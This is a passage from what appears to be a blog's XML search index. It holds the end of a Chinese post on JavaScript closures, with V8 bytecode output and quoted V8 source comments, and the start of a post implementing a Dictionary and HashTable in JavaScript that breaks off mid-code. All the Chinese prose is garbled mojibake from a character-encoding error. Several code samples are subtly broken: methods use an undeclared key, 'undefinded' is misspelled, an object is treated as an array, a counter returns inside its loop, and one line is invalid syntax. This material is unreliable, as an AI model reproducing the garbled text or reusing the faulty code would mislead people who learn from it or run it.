å¦‚æœèªªä½ èªç‚ºé–‰åŒ…ä¸€å®šè¦ï¼šã€Œé›¢é–‹å‰µé€ å®ƒçš„ç’°å¢ƒã€ï¼Œé‚£é¡¯ç„¶ã€Œæ‰€æœ‰çš„å‡½å¼éƒ½æ˜¯é–‰åŒ…ã€é€™å¥è©±å°±ä¸æˆç«‹ï¼›ä½†å¦‚æœä½ èªåŒé–‰åŒ…çš„å®šç¾©æ˜¯ï¼šã€Œç”±å‡½å¼å’Œèˆ‡å…¶ç›¸é—œçš„åƒç…§ç’°å¢ƒçµ„åˆè€Œæˆçš„å¯¦é«”ã€ï¼Œé‚£å°±ä»£è¡¨åœ¨ JavaScript è£¡é¢ï¼Œæ‰€æœ‰çš„å‡½å¼éƒ½æ˜¯é–‰åŒ…ã€‚
ç‚ºä»€éº¼ï¼Ÿå› ç‚ºé€™å°±æ˜¯ JavaScript çš„é‹è¡Œæ©Ÿåˆ¶ï¼Œä½ æ¯å€‹å®£å‘Šçš„ function éƒ½æœƒå„²å­˜è‘—[[Scope]]ï¼Œè€Œé€™å€‹è³‡è¨Šè£¡é¢å°±æ˜¯åƒç…§çš„ç’°å¢ƒã€‚
è€Œé€™å€‹èªªæ³•ä¹Ÿä¸æ˜¯æˆ‘è‡ªå‰µçš„ï¼Œåœ¨è§£é‡‹ ECMAScript æœ€ç¶“å…¸çš„ç³»åˆ—æ–‡ç« ä¸­çš„å…¶ä¸­ä¸€ç¯‡ï¼šECMA-262-3 in detail. Chapter 6. Closures.ï¼Œè£¡é¢æ˜¯é€™æ¨£èªªçš„ï¼š

Letâ€™s make a note again, that all functions, independently from their type: anonymous, named, function expression or function declaration, because of the scope chain mechanism, are closures.
from the theoretical viewpoint: all functions, since all they save at creation variables of a parent context. Even a simple global function, referencing a global variable refers a free variable and therefore, the general scope chain mechanism is used;

æ‰€ä»¥å¾ç†è«–ä¸Šä¾†èªªï¼ŒJavaScript è£¡é¢çš„æ‰€æœ‰ function éƒ½æ˜¯é–‰åŒ…ã€‚

from the practical viewpoint: those functions are interesting which:


continue to exist after their parent context is finished, e.g. inner functions returned from a parent function;
use free variables.

ä½†å¦‚æœä½ åªå¾ã€Œå¯¦ä½œã€ä¸Šçš„è§€é»ä¾†é—œå¿ƒé–‰åŒ…çš„è©±ï¼Œæˆ‘å€‘æœƒèªªé–‰åŒ…å¿…é ˆè¦ç”¨åˆ°è‡ªç”±è®Šæ•¸ï¼Œä¹Ÿå¿…é ˆåœ¨é›¢é–‹äº†å»ºç«‹çš„ context ä»¥å¾Œé‚„èƒ½å¤ å­˜åœ¨ï¼Œé€™æ¨£æ‰æ˜¯æˆ‘å€‘çœŸæ­£æ‰€é—œå¿ƒçš„é‚£å€‹é–‰åŒ…ã€‚
æ‰€ä»¥é–‰åŒ…åˆ°åº•æ˜¯ä»€éº¼ï¼Œç«¯çœ‹ä½ å¾å“ªå€‹è§’åº¦å»çœ‹ä»–ï¼Œä½†ç„¡åº¸ç½®ç–‘çš„ï¼Œå¾ç†è«–ä¸Šçš„è§’åº¦ä¾†çœ‹ JavaScript è£¡æ‰€æœ‰çš„ function éƒ½æ˜¯é–‰åŒ…ï¼Œå¦‚æœä½ é‚„æ˜¯ä¸ä¿¡çš„è©±ï¼Œé‚£æœ€å¾Œæˆ‘å¸¶ä½ ä¾†çœ‹çœ‹ V8 æ˜¯æ€éº¼æƒ³çš„ã€‚
å†æ¢ V8æˆ‘å€‘ä¸€æ¨£å¯«ä¸€æ®µç°¡å–®çš„ç¨‹å¼ç¢¼ï¼Œçœ‹çœ‹æœ€å¾Œæœƒ compile å‡ºä»€éº¼æ±è¥¿ï¼š
var a = 23function yoyoyo()&#123;  &#125;yoyoyo()

é€™é‚Šæ”¾ä¸€å€‹ 23 æ˜¯å› ç‚ºæ–¹ä¾¿æˆ‘å€‘åœ¨ byte code ä¸­å®šä½åˆ°é€™æ®µç¨‹å¼ï¼Œåªæœ‰ function æœƒæœ‰åç¨±å¯ä»¥è­˜åˆ¥ï¼Œé€™ç¨®å¯«åœ¨ global è£¡é¢çš„æ±è¥¿æ¯”è¼ƒé›£æ‰¾ã€‚
ç”¢ç”Ÿå‡ºçš„çµæœæ˜¯é€™æ¨£ï¼š
[generating bytecode for function: ]Parameter count 6Frame size 16         0x3e0ed5f6a9da @    0 : 6e 00 00 02       CreateClosure [0], [0], #2         0x3e0ed5f6a9de @    4 : 1e fa             Star r1   10 E&gt; 0x3e0ed5f6a9e0 @    6 : 91                StackCheck    70 S&gt; 0x3e0ed5f6a9e1 @    7 : 03 17             LdaSmi [23]         0x3e0ed5f6a9e3 @    9 : 1e fb             Star r0   95 S&gt; 0x3e0ed5f6a9e5 @   11 : 4f fa 01          CallUndefinedReceiver0 r1, [1]         0x3e0ed5f6a9e8 @   14 : 04                LdaUndefined   107 S&gt; 0x3e0ed5f6a9e9 @   15 : 95                Return   [generating bytecode for function: yoyoyo]Parameter count 1Frame size 0   88 E&gt; 0x3e0ed5f6b022 @    0 : 91                StackCheck          0x3e0ed5f6b023 @    1 : 04                LdaUndefined    93 S&gt; 0x3e0ed5f6b024 @    2 : 95                Return 

ä½ åªè¦çœ‹é—œéµå­—å°±å¥½äº†ï¼Œä½ æœ‰æ²’æœ‰çœ‹åˆ°å»ºç«‹ function çš„é‚£é‚Šæ˜¯ä»€éº¼ï¼Ÿæ˜¯CreateClosureï¼Œæˆ‘å€‘åªæ˜¯å¾ˆç°¡å–®çš„å‰µå»ºä¸€å€‹ function ä¸¦ä¸”å‘¼å«ä»–è€Œå·²ï¼ŒV8 ä¾ç„¶æ˜¯ç”¨CreateClosureé€™å€‹æŒ‡ä»¤ã€‚
é‚£å¦‚æœä»Šå¤©æ˜¯åœ¨ function è£¡é¢å»ºç«‹ä¸€å€‹æ–°çš„ function å‘¢ï¼Ÿ
function yoyoyo()&#123;  function inner()&#123;&#125;&#125;yoyoyo()

çµæœï¼š
[generating bytecode for function: yoyoyo]Parameter count 1Frame size 8         0x2c9f0836b0fa @    0 : 6e 00 00 02       CreateClosure [0], [0], #2         0x2c9f0836b0fe @    4 : 1e fb             Star r0   77 E&gt; 0x2c9f0836b100 @    6 : 91                StackCheck          0x2c9f0836b101 @    7 : 04                LdaUndefined   106 S&gt; 0x2c9f0836b102 @    8 : 95                Return 

ä¸€æ¨£é‚„æ˜¯å‘¼å«äº†CreateClosureã€‚æœ€å¾Œè®“æˆ‘å€‘ä¾†è©¦è©¦çœ‹æˆ‘å€‘æ‰€ç†ŸçŸ¥çš„é‚£ç¨®ï¼Œä¹Ÿå°±æ˜¯è¦å›å‚³å»ºç«‹çš„ functionï¼š
function yoyoyo()&#123;  function inner()&#123;&#125;  return inner&#125;yoyoyo()

çµæœï¼š
[generating bytecode for function: yoyoyo]Parameter count 1Frame size 8         0x3f4bde3eb0fa @    0 : 6e 00 00 02       CreateClosure [0], [0], #2         0x3f4bde3eb0fe @    4 : 1e fb             Star r0   77 E&gt; 0x3f4bde3eb100 @    6 : 91                StackCheck   116 S&gt; 0x3f4bde3eb101 @    7 : 95                Return 

å·®åˆ¥åœ¨å“ªè£¡ï¼Ÿåªå·®åœ¨å‰è€…åœ¨å›å‚³å‰å¤šäº†ä¸€å€‹LdaUndefined è¼‰å…¥ undefinedï¼Œå¾Œè€…æ²’åŠ æ‰€ä»¥æŠŠå»ºç«‹å‡ºä¾†çš„ function å‚³å›å»ã€‚å¯æ˜¯åœ¨å»ºç«‹ function çš„æŒ‡ä»¤ä¸Šé¢ï¼Œæ˜¯ä¸€æ¨¡ä¸€æ¨£çš„ï¼Œéƒ½å«åšCreateClosureã€‚
åªçœ‹ compile å‡ºä¾†çš„ç¨‹å¼ç¢¼æˆ–è¨±æœ‰å¤±å…¬å…ï¼Œå¦‚æœèƒ½çœ‹åˆ° V8 å…§éƒ¨æ€éº¼è¬›å°±å†å¥½ä¸éäº†ã€‚
ä»¥å‰æ›¾ç¶“è©¦åœ–æƒ³æ‰¾ä½†æ˜¯ V8 å¤ªå¤§äº†ï¼Œé€™æ¬¡æˆ‘ç¢°å·§åœ¨æ‰¾è³‡æ–™çš„æ™‚å€™çœ‹è¦‹é€™ç¯‡æ–‡ç« ï¼šAnalyze implementation of closures in V8ï¼Œé›–ç„¶æ˜¯ä¹å¹´å‰çš„æ–‡ç« ï¼Œä½†è£¡é¢æœ‰ç¨å¾®æåˆ°ä¸€äº›é—œéµå­—ï¼Œæˆ‘å¾ªè‘—é—œéµå­—å»æ‰¾ï¼Œæ‰¾åˆ°äº†å¹¾å€‹å¾ˆæœ‰è¶£çš„åœ°æ–¹ã€‚
ç¬¬ä¸€å€‹æ˜¯ src&#x2F;interpreter&#x2F;interpreter-generator.cc é€™éš»æª”æ¡ˆï¼Œè£¡é¢è¨˜éŒ„è‘—æ‰€æœ‰ byte code çš„æŒ‡ä»¤ï¼Œå°CreateClosureå®ƒæ˜¯é€™éº¼æè¿°çš„ï¼š
// CreateClosure &lt;index&gt; &lt;slot&gt; &lt;tenured&gt;//// Creates a new closure for SharedFunctionInfo at position |index| in the// constant pool and with the PretenureFlag &lt;tenured&gt;.

é€™æª”æ¡ˆå°ä»¥å¾Œçœ‹ byte code å¾ˆæœ‰å¹«åŠ©ï¼Œæ‰€ä»¥è¦ç‰¹åœ° po åœ¨é€™é‚Šè¨˜èµ·ä¾†ã€‚
ç¬¬äºŒå€‹æ˜¯ src&#x2F;contexts.hï¼Œé€™é‚Šç´€éŒ„çš„è³‡è¨Šååˆ†è±å¯Œï¼Œä½ å¯ä»¥çœ‹åˆ°é€™ä¸€æ®µè¨»è§£ï¼š
// JSFunctions are pairs (context, function code), sometimes also called// closures. A Context object is used to represent function contexts and// dynamically pushed &#x27;with&#x27; contexts (or &#x27;scopes&#x27; in ECMA-262 speak).//// At runtime, the contexts build a stack in parallel to the execution// stack, with the top-most context being the current context. All contexts// have the following slots://// [ scope_info     ]  This is the scope info describing the current context. It//                     contains the names of statically allocated context slots,//                     and stack-allocated locals.  The names are needed for//                     dynamic lookups in the presence of &#x27;with&#x27; or &#x27;eval&#x27;, and//                     for the debugger.

é™¤äº†æˆ‘å€‘æœ€æƒ³çŸ¥é“çš„ Closureï¼Œå®ƒä¹Ÿæåˆ°äº† context è·Ÿ scope infoï¼Œéƒ½æ˜¯æˆ‘å€‘ä¸Šé¢æ‰€è¨è«–çš„æ±è¥¿ï¼Œæ¦‚å¿µé¡ä¼¼åªæ˜¯åè©æœ‰é»ä¸å¤ªä¸€æ¨£è€Œå·²ã€‚
ä½†æœ€é‡è¦çš„æ˜¯é€™å¥ï¼š

JSFunctions are pairs (context, function code), sometimes also called closures.

æ¯ä¸€å€‹ JS çš„ function éƒ½è¨˜éŒ„è‘— context çš„è³‡è¨Šï¼Œå†æ¬¡å°è­‰äº†æˆ‘å€‘å…ˆå‰æ‰€è¬›çš„æ©Ÿåˆ¶ã€‚
ç¬¬ä¸‰å€‹ä¹Ÿæ˜¯æœ€å¾Œä¸€å€‹ï¼Œæˆ‘æ„å¤–åœ°ç™¼ç¾äº† V8 è£¡é¢è™•ç† scope çš„åœ°æ–¹ï¼Œåœ¨ src&#x2F;ast&#x2F;scopes.ccï¼Œé»é€£çµä¹‹å¾Œé€£åˆ°çš„åœ°æ–¹LookupRecursiveå°±æ˜¯åœ¨è¬›è¿°å°‹æ‰¾è®Šæ•¸çš„éç¨‹ï¼Œå…ˆåœ¨ scope è£¡é¢æ‰¾ï¼Œæ²’æœ‰çš„è©±å†å¾€ä¸Šé¢æ‰¾ï¼Œé‚„æ˜¯æ‰¾ä¸åˆ°çš„è©±å°±åœ¨ global å®£å‘Šä¸€å€‹ã€‚
ç†ŸçŸ¥é€™æ®µéç¨‹é€™éº¼ä¹…ï¼Œç¬¬ä¸€æ¬¡çœ‹è¦‹ V8 çš„å¯¦ç¾é•·æ€æ¨£ï¼Œå¯¦åœ¨æ˜¯å¾ˆæœ‰è¶£ã€‚é›–ç„¶ C++ çœ‹ä¸å¤ªæ‡‚ï¼Œä½†å¹¸å¥½æ–‡ç« è£¡é¢æœ‰å¤§é‡çš„è¨»è§£ï¼Œæ‰€ä»¥çœ‹è‘—è¨»è§£å°±å¯ä»¥ç†è§£äº”å…­æˆçš„ç¨‹å¼ç¢¼ã€‚
çµè«–æœ‰ä¸€å€‹å°åœ°æ–¹è¦å…ˆèªªæ˜ï¼Œåœ¨æˆ‘é€™ç¯‡ä»¥åŠä¸Šä¸€ç¯‡è£¡é¢ï¼Œæˆ‘éƒ½åˆ»æ„ä¸æåŠevalè·Ÿwithé€™å…©å€‹æ±è¥¿ï¼Œå› ç‚ºé€™å…©å€‹æ±è¥¿æœƒè®“ä½œç”¨åŸŸè®Šå¾—è¤‡é›œè¨±å¤šæ‰€ä»¥æˆ‘æ‰æ•…æ„ä¸å¸¶åˆ°ï¼Œåœ¨æˆ‘çœ‹ V8 ç¨‹å¼ç¢¼çš„æ™‚å€™ä¹Ÿçœ‹åˆ°å¤§é‡ç¨‹å¼ç¢¼æ˜¯åœ¨è™•ç†é€™å…©å€‹çš„æ“ä½œï¼Œå¦‚æœä½ å°é€™å…©å€‹æ“ä½œæœ‰èˆˆè¶£ï¼Œå¯ä»¥è‡ªè¡Œå»æ‰¾ç›¸é—œçš„æ–‡ç« ä¾†çœ‹ã€‚
åœ¨ä¸Šä¸€æ¬¡å¾¹åº•ç†è§£ hoisting çš„éç¨‹ä¸­æˆ‘å€‘æœ‰äº†æœ€é‡è¦çš„åº•å±¤æ©Ÿåˆ¶çš„é‹è¡Œæ¦‚å¿µï¼Œä¹Ÿç¨å¾®çœ‹åˆ°äº† V8 çš„ byte codeï¼Œåœ¨é€™ä¸€æ¬¡å‰‡æ˜¯æŠŠä¸Šæ¬¡çš„æ¨¡å‹è£œå……å¾—æ›´å®Œæ•´ï¼Œåªè¦æŒ‰ç…§é‚£å€‹æ¨¡å‹å»è§£é‡‹ç¨‹å¼çš„é‹è¡Œï¼Œä»€éº¼ hoisting ä»€éº¼ closure çš„éƒ½èƒ½å¤ è¼•é¬†ç†è§£ã€‚
é€™æ¬¡ä¹Ÿæ›´æ·±å…¥äº† V8ï¼Œç›´æ¥çœ‹åˆ°è™•ç† scope ä»¥åŠ context ç›¸é—œçš„ç¨‹å¼ç¢¼ï¼Œä½† V8 ç•¢ç«Ÿé‚„æ˜¯ä¸€å€‹å¾ˆå¤§çš„å°ˆæ¡ˆï¼Œå…‰å¹¾å€‹æª”æ¡ˆæˆ‘å°±çœ‹ä¸å®Œäº†ï¼Œæ ¹æœ¬ä¸èƒ½è«‡ä¸Šç†è§£ï¼Œå› æ­¤åªæ˜¯ä»¥ä¸€ç¨®å¥½ç©çš„è§’åº¦æƒ³å»çœ‹ä¸€ä¸‹è€Œå·²ã€‚
é€™ç¯‡çš„ç›®æ¨™è·Ÿä¸Šä¸€ç¯‡ä¸€æ¨£ï¼Œå°æ–¼æœ¬ä¾†å°±å°é€™å€‹ä¸»é¡Œä¸ç†Ÿçš„äººï¼Œå¸Œæœ›èƒ½å¤ è®“ä½ å€‘ç†è§£é€™å€‹ä¸»é¡Œï¼›å°æ–¼å·²ç¶“ç†Ÿæ‚‰çš„äººä¹Ÿå¸Œæœ›èƒ½å¸¶ä¾†ä¸€äº›æ–°çš„æƒ³æ³•ï¼Œç•¢ç«Ÿæˆ‘å·¦çœ‹å³çœ‹ä¸Šçœ‹ä¸‹çœ‹éƒ½æ²’çœ‹åˆ°ä»€éº¼äººç›´æ¥è·‘å» V8 æ‰¾ç›¸é—œçš„ç¨‹å¼ç¢¼æ®µè½å‡ºä¾†ã€‚
æœ€å¾Œï¼Œå†æ¬¡å¹«è‡ªå·±å·¥å•†ä¸€ä¸‹ï¼Œæˆ‘å‰é™£å­æŠŠè‡ªå·±ä»¥å‰å¯«éçš„æ–‡ç« éƒ½æ”¾åˆ°äº† GitHub ä¸Šé¢ï¼Œå¦‚æœæœ‰æƒ³è¨è«–çš„å¯ä»¥åœ¨é€™ç¯‡æ–‡ç« çš„ GitHub ç‰ˆæœ¬ä¸‹é¢ç•™è¨€ï¼Œæƒ³æ”¶åˆ°æ–°æ–‡ç« é€šçŸ¥çš„ä¹Ÿå¯ä»¥æŒ‰å€‹ watch è·Ÿ starï¼Œæ„Ÿè¬ã€‚
åƒè€ƒè³‡æ–™ï¼š

ä»static&#x2F;dynamic scopeæ¥è°ˆJSçš„ä½œç”¨åŸŸ
MDN
æ·±å…¥æ·ºå‡ºç­è§£ JavaScript é–‰åŒ…ï¼ˆclosureï¼‰
ä½ ä¸å¯ä¸çŸ¥çš„ JavaScript äºŒä¸‰äº‹#Day5ï¼šæ¹¯å§†å…‹é­¯æ–¯èˆ‡å”å®¶éœ¸ç‹æ§â€”â€”è®Šæ•¸çš„ä½œç”¨åŸŸ(Scope) (1)
é—œæ–¼ JS ä½œç”¨åŸŸè£¡é¢çš„è§£é‡‹
ECMA-262-3 in detail. Chapter 6. Closures.
Grokking V8 closures for fun (and profit?)
Understanding JavaScript Closures
https://javascript.info/closure
Analyze implementation of closures in V8

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>closure</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ JavaScript å­¸ç¿’è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•ï¼šå­—å…¸ï¼ˆDictionaryï¼‰å’Œé›œæ¹Šè¡¨ï¼ˆHash Tableï¼‰ç¯‡</title>
    <url>/2017/03/10/javascript-data-structure-algorithm-dictionary-hash-table/</url>
    <content><![CDATA[
å‰è¨€åœ¨ä¹‹å‰æˆ‘å€‘å­¸ç¿’äº†ä¸€ç¨®ä¸é‡è¤‡å…ƒç´ çš„é›†åˆï¼Œæœ¬æ–‡æˆ‘å€‘ç¹¼çºŒè¨è«–å¦å¤–ä¸€ç¨®ä¸é‡è¤‡å€¼çš„è³‡æ–™çµæ§‹ï¼šå­—å…¸ï¼ˆDictionaryï¼‰å’Œé›œæ¹Šè¡¨ï¼ˆHash Tableï¼‰ã€‚åœ¨é›†åˆä¸­æˆ‘å€‘ä¸»è¦é—œå¿ƒçš„æ˜¯å€¼æœ¬èº« &#123; å€¼ï¼ˆvalueï¼‰ï¼š å€¼ï¼ˆvalueï¼‰&#125;ï¼Œåœ¨å­—å…¸ï¼ˆDictionaryï¼‰å’Œé›œæ¹Šè¡¨ï¼ˆHash Tableï¼‰å‰‡æ˜¯æœ‰ &#123; éµï¼ˆkeyï¼‰: å€¼ï¼ˆvalueï¼‰&#125; ä¹‹é–“çš„ mapping é—œä¿‚ã€‚
ä»€éº¼æ˜¯å­—å…¸ï¼ˆDictionaryï¼‰ï¼Ÿ

å»ºç«‹å­—å…¸é¡åˆ¥ èˆ‡ Set çš„æƒ…æ³é¡ä¼¼ï¼Œåœ¨ ES6 ä¸­ä¹Ÿæœ‰åŸç”Ÿçš„ Map é¡åˆ¥å¯¦ä½œï¼Œå› æ­¤æœ¬ç« æˆ‘å€‘ä¹Ÿåƒè€ƒ ES6 çš„ Map é¡åˆ¥é€²è¡Œå¯¦ä½œï¼š
 function Dictionary() &#123;	let items = &#123;&#125;;	this.set = function(key, value) &#123;&#125;;	this.remove = function(key) &#123;&#125;;	this.has = function(key) &#123;&#125;;	this.get = function(key) &#123;&#125;;	this.clear = function() &#123;&#125;;	this.size = function() &#123;&#125;;	this.keys = function() &#123;&#125;;	this.values = function() &#123;&#125;;&#125;


has(key)ï¼šåˆ¤æ–·æ˜¯ key æ˜¯å¦å­˜åœ¨ï¼Œé€™åœ¨ Dictionary å°¤å…¶é‡è¦

 this.has = function(key) &#123;	return key in items;	// ä¹Ÿå¯ä»¥ä½¿ç”¨ return items.hasOwnProperty(key);&#125;


set(key, value)ï¼šæ–°å¢ä¸€å€‹éµå€¼

 this.set = function(key, value) &#123;	items[key] = value;&#125;;


remove()ï¼šåˆªé™¤ä¸€å€‹éµå€¼

 this.remove = function() &#123;	if(this.has(key)) &#123;		delete items[key];		return true;	&#125;	return false;&#125;;


get()ï¼šè®€å–ä¸€å€‹å€¼

 this.get = function() &#123;	// å…ˆåˆ¤æ–·æ˜¯å¦å­˜åœ¨éµ	return this.has(key) ? items[key] : undefinded;&#125;;


values()ï¼šå›å‚³æ‰€æœ‰å€¼

 this.values = function() &#123;	let values = &#123;&#125;;	for(let k in items) &#123;		if(this.has(k)) &#123;			values.push(items[k]);		&#125;	&#125;	return values;&#125;;


clear()ï¼šæ¸…é™¤å­—å…¸

 this.clear = function() &#123;	items = &#123;&#125;;&#125;;


size()ï¼šå›å‚³å­—å…¸é•·åº¦

ä½¿ç”¨é¡ä¼¼æ–¼ Linked List çš„ length è®Šæ•¸è¨ˆç®—æ³•ï¼Œç•¶æ–°å¢ã€åˆªé™¤å…ƒç´ æ™‚é †ä¾¿å¢æ¸›é•·åº¦

  this.size = function() &#123;	return length;&#125;


ä½¿ç”¨ JavaScript å…§å»º Object é¡åˆ¥çš„å…§å»ºå‡½æ•¸ keys

  this.size = function() &#123;	return Object.keys(items).length;&#125;


æ‰‹å‹•è¿­ä»£åˆ¤æ–·æ˜¯å¦å­˜åœ¨é›†åˆä¸­ä¸¦ç´¯åŠ å€‹æ•¸

  this.size = function() &#123;	let count = 0;	// ç‰¹åˆ¥æ³¨æ„åœ¨ JavaScript ä¸­ for in æœƒä¸€èµ·æŠŠç¹¼æ‰¿æ–¼ Object é¡åˆ¥å’Œç‰©ä»¶è‡ªèº«çš„æ‰€æœ‰ç›¸é—œéç›¸é—œè³‡æ–™çµæ§‹çš„å±¬æ€§ä¸€èµ·è¿­ä»£å‡ºä¾†	for(let prop in items) &#123;		// åˆ¤æ–·æ˜¯å¦å±¬æ–¼ items çš„å±¬æ€§		if(items.hasOwnProperty(prop)) &#123;			++count;		&#125;		return count;	&#125;&#125;

keys()ï¼šå›å‚³å­—å…¸æ“æœ‰çš„éµ


 this.keys = function() &#123;	return Object.keys(items);&#125;


getItems()ï¼šå›å‚³å­—å…¸

 this.getItems() &#123;	return items;&#125;;

ä½¿ç”¨å­—å…¸
 const dictionary = new Dictionary();// æ–°å¢éµå€¼dictionary.set(&#x27;Mark&#x27;, &#x27;mark@gmail.com&#x27;);dictionary.set(&#x27;Ivy&#x27;, &#x27;ivy@gmail.com&#x27;);dictionary.set(&#x27;Mary&#x27;, &#x27;mary@gmail.com&#x27;);console.log(dictionary.keys()); console.log(dictionary.values()); console.log(dictionary.get(&#x27;Mark&#x27;)); dictionary.remove(&#x27;Mark&#x27;);console.log(dictionary.keys()); 

ä»€éº¼æ˜¯é›œæ¹Šè¡¨ï¼ˆHash Tableï¼‰ï¼Ÿ
æ¥ä¸‹ä¾†æˆ‘å€‘å°‡ä»‹ç´¹ Hash Tableï¼Œä¹Ÿå¯ç¨±ä½œ HashMapï¼Œæ˜¯ Dictionary é¡åˆ¥ä¸­é›œæ¹Šè¡¨çš„ä¸€ç¨®å¯¦ä½œã€‚å¯¦ä½œçš„æ€è·¯å¤§æ¦‚æ˜¯ï¼šç•¶è¦æŠŠè³‡æ–™æ”¾åˆ°é›œæ¹Šè¡¨æ™‚ï¼Œå…ˆçµ¦å®šä¸€å€‹ key å’Œå­˜æ”¾çš„ valueï¼Œä¸¦å°‡ key çš„æ¯å€‹å­—å…ƒè½‰æ›æˆ ASCII Code æˆ– Unicode Code ä¸¦ç›¸åŠ ï¼Œé€™å€‹ç›¸åŠ çš„å€¼å³æ˜¯ hash éµå€¼ï¼Œåœ¨ table é™£åˆ—ä¸Šå°æ‡‰åˆ°å­˜æ”¾çš„ valueã€‚

å»ºç«‹é›œæ¹Šè¡¨
 function HashTable() &#123;	let table = [];	let getHashTableCode = function(key) &#123;		let hash = 0;		for(let i = 0; i &lt; key.length; i++) &#123;			// charCodeAt æœƒå›å‚³æŒ‡å®šå­—ä¸²å…§å­—å…ƒçš„ Unicode ç·¨ç¢¼ï¼ˆå¯ä»¥åŒ…å«ä¸­æ–‡å­—ï¼‰			hash += key.charCodeAt(i);		&#125;		// ç‚ºäº†å–åˆ°è¼ƒå°å€¼ï¼Œä½¿ç”¨ä»»æ„æ•¸åšé™¤æ³• mod è™•ç†		return hash % 37;	&#125;	this.put = function(key, value) &#123;		// æ ¹æ“š key å–å‡º Hash Function ç”¢ç”Ÿçš„ position		const position = getHashTableCode(key);		// å°æ‡‰ key å’Œ value		table[position] = value;	&#125;	this.get = function(key) &#123;		// æ ¹æ“š key å–å‡º Hash Function ç”¢ç”Ÿçš„ position		const position = getHashTableCode(key);		// å›å‚³å€¼		return table[position];	&#125;	this.remove = function(key) &#123;		// æ ¹æ“š key å–å‡º Hash Function ç”¢ç”Ÿçš„ position		const position = getHashTableCode(key);		// ç”±æ–¼æˆ‘å€‘ä¸èƒ½æ”¹è®Šé™£åˆ—é•·åº¦ï¼ˆå› ç‚ºæœƒå½±éŸ¿åˆ°å…¶å®ƒå°æ‡‰ä½ç½®ï¼‰ï¼Œæ‰€ä»¥å°‡å€¼çµ¦å®š undefinded		table[position] = undefinded;	&#125;&#125;

ä½¿ç”¨é›œæ¹Šè¡¨ 
 let hashTable = new HashTable();hashTable.put(&#x27;Mark&#x27;, &#x27;mark@gmail.com&#x27;);hashTable.put(&#x27;Ivy&#x27;, &#x27;ivy@gmail.com&#x27;);hashTable.put(&#x27;Mary&#x27;, &#x27;mary@gmail.com&#x27;);hashTable.get(&#x27;Mark&#x27;);hashTable.get(&#x27;Jack&#x27;);// åˆªé™¤éµå€¼ç‚º Mark è³‡æ–™hashTable.remove(&#x27;Mark&#x27;);hashTable.get(&#x27;Mark&#x27;);

è™•ç†é›œæ¹Šè¡¨è¡çª
 åœ¨ä¸Šé¢å¯¦ä½œçš„éç¨‹ä¸­ï¼Œè°æ˜çš„è®€è€…æ‡‰è©²å¯ä»¥ç™¼ç¾ï¼šé›–ç„¶é›œæ¹Šè¡¨æ–¹ä¾¿å¥½ç”¨ï¼Œä½†æœ‰å¯èƒ½æœƒæœ‰ä¸åŒéµå€¼ä½†æœ‰ç›¸åŒé›œæ¹Šå€¼çš„æƒ…æ³å‡ºç¾ï¼ˆä¾‹å¦‚ï¼šJamie å’Œ Sue çš„å€¼ ASCII Code ç›¸åŠ å°±ç›¸åŒï¼‰ã€‚é€™ç¨®ä¸åŒå€¼å»åœ¨é›œæ¹Šè¡¨å°æ‡‰ç›¸åŒä½ç½®çš„æƒ…æ³æˆ‘å€‘ç¨±ä½œè¡çªï¼ˆcollisionï¼‰ï¼Œè‹¥ä¸è™•ç†çš„è©±ï¼Œå¾Œä¾†çš„å€¼æœƒè¦†è“‹æ‰ä¹‹å‰çš„å€¼ã€‚æ¥ä¸‹ä¾†æˆ‘å€‘æœƒä»‹ç´¹ä¸‰ç¨®æ–¹å¼ä¾†é¿å…ç¢°æ’ï¼ˆcollisionï¼‰ã€‚

åˆ†é›¢éˆçµï¼šåˆ†é›¢éˆçµæ˜¯åœ¨æ¯ä¸€å€‹ hash value æ”¾ç½®ä¸€å€‹éˆçµä¸²åˆ—ï¼Œç•¶æœ‰ hash key ç›¸åŒçš„å€¼è¦æ”¾å…¥æ™‚å°±æ–°å¢é€²éˆçµä¸²åˆ—ï¼Œæ˜¯ä¸€å€‹ç›¸å°ç°¡å–®çš„æ–¹å¼ï¼Œä½†éœ€è¦é¡å¤–çš„éˆçµä¸²åˆ—ç©ºé–“ã€‚

 
 æ›´æ–°éå¾Œçš„ HashTableï¼š
 function LinkedList() &#123;	const Node = function(element) &#123;		this.element = element;		this.next = null;	&#125;	// å­˜æ”¾ LinkedList é•·åº¦	let length = 0;	// ç¬¬ä¸€å€‹ç¯€é»çš„æŒ‡æ¨™	let head = null;	// åœ¨å°¾éƒ¨æ–°å¢ä¸€å€‹ç¯€é»	this.append = function(element) &#123;&#125;;	// åœ¨ç‰¹å®šä½ç½®æ–°å¢ä¸€å€‹å…ƒç´ ç¯€é»	this.insert = function(position, element) &#123;&#125;;	// å¾ä¸²åˆ—ä¸­ç§»é™¤ä¸€å€‹å…ƒç´ ç¯€é»	this.remove = function(element) &#123;&#125;;	// å¾ä¸²åˆ—ä¸­ç§»é™¤ä¸€å€‹ç‰¹å®šçš„ç¯€é»	this.removeAt = function(position) &#123;&#125;;	// å›å‚³å…ƒç´ åœ¨ä¸²åˆ—çš„å…ƒç´ ç¯€é» indexï¼Œè‹¥ç„¡å‰‡å›å‚³ -1	this.indexOf = function(element) &#123;&#125;;	// åˆ¤æ–·ä¸²åˆ—æ˜¯å¦ç‚ºç©ºï¼Œæ˜¯å›å‚³ trueï¼Œåä¹‹ false	this.isEmpty = function() &#123;&#125;;	// å›å‚³ä¸²åˆ—å…ƒç´ å€‹æ•¸	this.size = function() &#123;&#125;;	// ç”±æ–¼ Node æ˜¯ä¸€å€‹ç‰©ä»¶ï¼Œæ‰€ä»¥é‹ç”¨ toString æ–¹æ³•å°‡è³‡æ–™å€¼è¼¸å‡º	this.toString = function() &#123;&#125;;	// åˆ—å°å‡ºå€¼	this.print = function() &#123;&#125;;&#125;function HashTable() &#123;	let table = [];	// å¯¦ä½œå…§éƒ¨ä¸€å€‹ ValuePair é¡åˆ¥ï¼Œå­˜åŸå§‹ keyã€value	let ValuePair = function(key, value) &#123;		this.key = key;		this.value = value;	&#125;	let getHashTableCode = function(key) &#123;		let hash = 0;		for(let i = 0; i &lt; key.length; i++) &#123;			// charCodeAt æœƒå›å‚³æŒ‡å®šå­—ä¸²å…§å­—å…ƒçš„ Unicode ç·¨ç¢¼ï¼ˆå¯ä»¥åŒ…å«ä¸­æ–‡å­—ï¼‰			